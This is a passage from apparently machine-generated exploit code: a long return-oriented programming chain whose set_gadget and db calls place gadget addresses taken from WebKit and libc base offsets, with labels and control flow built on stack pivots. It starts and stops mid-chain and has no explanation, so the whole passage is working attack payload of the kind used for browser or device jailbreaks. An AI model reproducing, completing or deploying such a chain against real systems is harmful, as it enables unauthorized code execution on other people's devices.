ropchain+131048, //L1723-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L1722:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1723:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+131120, //L1726-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
//L1724:
db([12, 0]); // 0xc
set_gadget(libc_base+757614,); //pop rcx
//L1726:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+131280, //L1728-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+131296, //L1729-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+131264, //L1727-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1727:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1728:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+131400, //L1730-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+131432, //L1732-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+131416, //L1731-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1730:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1731:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
webkit_base+2766990, //setle al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+131600, //L1734-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+131616, //L1735-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+131584, //L1733-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1733:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1734:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1735:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+131752, //L1739-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+131784, //L1741-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+131736, //L1738-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1737:
db([1, 0]); // 0x1
set_gadget(libc_base+155394,); //pop rdi
//L1738:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L1739:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1740:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1741:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+710025, //setne al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+131920, //L1742+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+131896, //L1742-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L1742:
db([0, 0]); // 0x0
set_gadgets([
ropchain+131936, //L1742+24
ropchain+136056, //L1736
libc_base+362222, //pop rsi
ropchain+131976, //L1745-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1743:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1745:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+132080, //L1748-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+132064, //L1747-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1747:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+132200, //L1750-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+132232, //L1752-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+132216, //L1751-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L1749:
db([36, 0]); // 0x24
set_gadget(libc_base+757614,); //pop rcx
//L1750:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1751:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1752:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+132336, //L1755-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+132320, //L1754-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1754:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1755:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+132504, //L1758-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+132520, //L1759-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+132472, //L1756-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+132488, //L1757-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1756:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1757:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1758:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+132592, //L1760-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+132608, //L1761-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1760:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1761:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+132704, //L1763-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+132688, //L1762-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1762:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1763:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+132800, //L1766-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1764:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1766:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+132904, //L1769-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+132888, //L1768-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1768:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1769:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+133024, //L1771-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+133056, //L1773-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+133040, //L1772-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L1770:
db([12, 0]); // 0xc
set_gadget(libc_base+757614,); //pop rcx
//L1771:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1772:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+133160, //L1776-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+133144, //L1775-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1775:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1776:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+133328, //L1779-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+133344, //L1780-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+133296, //L1777-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+133312, //L1778-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1777:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1778:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1779:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1780:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+133416, //L1781-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+133432, //L1782-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1781:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+133536, //L1783-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+133568, //L1785-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+133552, //L1784-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1783:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1784:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1785:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
webkit_base+2766990, //setle al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+133736, //L1787-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+133752, //L1788-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+133720, //L1786-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1786:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1787:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1788:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+133888, //L1792-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+133920, //L1794-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+133872, //L1791-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1790:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1791:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L1792:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1793:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1794:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+134048, //L1795+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+134024, //L1795-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L1795:
db([0, 0]); // 0x0
set_gadgets([
ropchain+134064, //L1795+24
ropchain+135696, //L1789
libc_base+362222, //pop rsi
ropchain+134104, //L1798-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1796:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1798:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+134208, //L1801-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+134192, //L1800-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1800:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1801:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+134376, //L1804-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+134392, //L1805-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+134344, //L1802-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+134360, //L1803-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1802:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1803:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1804:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1805:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+134464, //L1806-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+134480, //L1807-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1806:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1807:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+134640, //L1811-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+134592, //L1808-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+134624, //L1810-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1808:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1809:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L1810:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+134696, //L1813-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L1813:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+134800, //L1814-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+134832, //L1816-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+134816, //L1815-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1814:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1815:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1816:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+134904, //L1817-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+134920, //L1818-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1817:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1818:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+135016, //L1820-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+135000, //L1819-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1819:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1820:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+135096, //L1821-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1821:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1822:
db([10, 0]); // 0xa
set_gadget(libc_base+155394,); //pop rdi
//L1823:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+135232, //L1824-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+135264, //L1826-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+135248, //L1825-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1824:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1825:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
libc_base+710025, //setne al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+135432, //L1828-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+135448, //L1829-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+135416, //L1827-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1827:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1828:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1829:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+135552, //L1830-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+135600, //L1833-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+135568, //L1831-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1830:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1831:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1832:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1833:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+710025, //setne al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+135672, //L1835-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1835:
db([0, 0]); // 0x0
//L1789:
set_gadgets([
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+135792, //L1837-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+135808, //L1838-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+135776, //L1836-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1836:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1837:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1838:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+135912, //L1839-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+135960, //L1842-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+135928, //L1840-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1839:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1840:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1841:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+710025, //setne al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+136032, //L1844-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1844:
db([0, 0]); // 0x0
//L1736:
set_gadgets([
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+136152, //L1846-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+136168, //L1847-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+136136, //L1845-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1845:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1846:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+136272, //L1849-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+136320, //L1852-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+136304, //L1851-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1849:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1850:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1851:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1852:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+136448, //L1853+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+136424, //L1853-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L1853:
db([0, 0]); // 0x0
set_gadgets([
ropchain+136464, //L1853+24
ropchain+138760, //L1848
libc_base+362222, //pop rsi
ropchain+136504, //L1856-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1854:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+136608, //L1859-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+136592, //L1858-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1858:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1859:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+136776, //L1862-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+136792, //L1863-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+136744, //L1860-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+136760, //L1861-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1860:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1861:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1862:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+136864, //L1864-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+136880, //L1865-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1864:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1865:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+137040, //L1869-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+136992, //L1866-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+137024, //L1868-0x10
